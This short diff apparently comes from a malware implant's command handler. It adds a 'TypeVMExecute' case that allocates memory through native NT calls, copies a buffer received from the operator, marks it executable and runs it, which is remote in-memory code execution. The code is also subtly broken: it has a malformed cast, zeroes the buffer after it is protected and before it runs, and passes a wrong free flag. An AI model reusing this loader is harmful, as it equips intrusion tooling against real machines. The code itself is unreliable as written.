@@ -272,8 +272,27 @@ namespace Message {
             }
 
             case TypeVMExecute: {
-                Ctx->Nt.NtAllocateVirtualMemory(PAGE_READWRITE);
-                Ctx->Nt.NtProtectVirtualMemory(PAGE_EXECUTE_READ);
+
+                LPVOID exec = { };
+                SIZE_T size = Parser.Length;
+
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+                    return_defer(ntstatus);
+                }
+
+                x_memcpy(exec, Parser.Buffer, Parser.Length);
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, nullptr))) {
+                    return_defer(ntstatus);
+                }
+
+                void (*Cmd)(PPARSER) = (void (*)(PPARSER)exec);
+
+                x_memset(exec, 0, size);
+                Cmd(&Parser);
+
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &exec, &size, MEM_FREE))) {
+                    return_defer(ntstatus);
+                }
             }
             default:
                 break;
